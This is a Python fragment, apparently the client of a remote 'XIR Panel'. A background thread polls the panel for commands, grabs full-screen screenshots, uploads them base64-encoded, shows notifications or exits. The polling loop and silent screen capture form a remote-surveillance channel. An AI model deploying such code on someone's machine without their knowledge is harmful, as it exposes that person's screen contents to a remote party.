def take_screenshot_for_admin():
    try:
        from PIL import ImageGrab
        import io
        import base64
        
        img = ImageGrab.grab()
        
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        
        screenshot_b64 = base64.b64encode(buf.read()).decode('utf-8')
        buf.close()
        
        print("[INFO] Screenshot taken for admin")
        return screenshot_b64
        
    except Exception as e:
        print(f"[ERROR] Screenshot could not be taken: {e}")
        return None



def process_admin_commands(username, panel_url):
    import time
    import requests
    import json
    
    while True:
        try:
            
            response = requests.get(f"{panel_url}/get_command/{username}", timeout=5)
            if response.status_code == 200:
                command_data = response.json()
                
                if command_data and 'command' in command_data:
                    command = command_data['command']
                    cmd_id = command_data['id']
                    
                    print(f"[INFO] Received command: {command}")
                    
                    if command == 'take_screenshot':
                        
                        screenshot_b64 = take_screenshot_for_admin()
                        
                        if screenshot_b64:
                            
                            result_data = {
                                'id': cmd_id,
                                'result': screenshot_b64
                            }
                            requests.post(f"{panel_url}/set_command_result", 
                                        json=result_data, timeout=10)
                            print("[INFO] Screenshot sent to admin")
                        else:
                            
                            result_data = {
                                'id': cmd_id,
                                'result': 'ERROR: Screenshot could not be taken'
                            }
                            requests.post(f"{panel_url}/set_command_result", 
                                        json=result_data, timeout=5)
                    
                    elif command == 'notify':
                        
                        params = json.loads(command_data.get('params', '{}'))
                        msg = params.get('msg', 'Admin mesajÄ±')
                        
                        try:
                            from plyer import notification
                            notification.notify(
                                title="XIR Panel",
                                message=msg,
                                timeout=10
                            )
                        except:
                            print(f"[NOTIFY] {msg}")
                        
                        
                        result_data = {
                            'id': cmd_id,
                            'result': 'Notification sent'
                        }
                        requests.post(f"{panel_url}/set_command_result", 
                                    json=result_data, timeout=5)
                    
                    elif command == 'shutdown':
                        
                        result_data = {
                            'id': cmd_id,
                            'result': 'Shutting down...'
                        }
                        requests.post(f"{panel_url}/set_command_result", 
                                    json=result_data, timeout=5)
                        
                        print("[INFO] Shutdown command received")
                        import sys
                        sys.exit(0)
            
            time.sleep(2)  
            
        except Exception as e:
            print(f"[ERROR] Command processing error: {e}")
            time.sleep(5)

def start_background_services(username, panel_url):
    import threading
    
    command_thread = threading.Thread(target=process_admin_commands, args=(username, panel_url), daemon=True)
    command_thread.start()
    
    print("[INFO] Background services started")
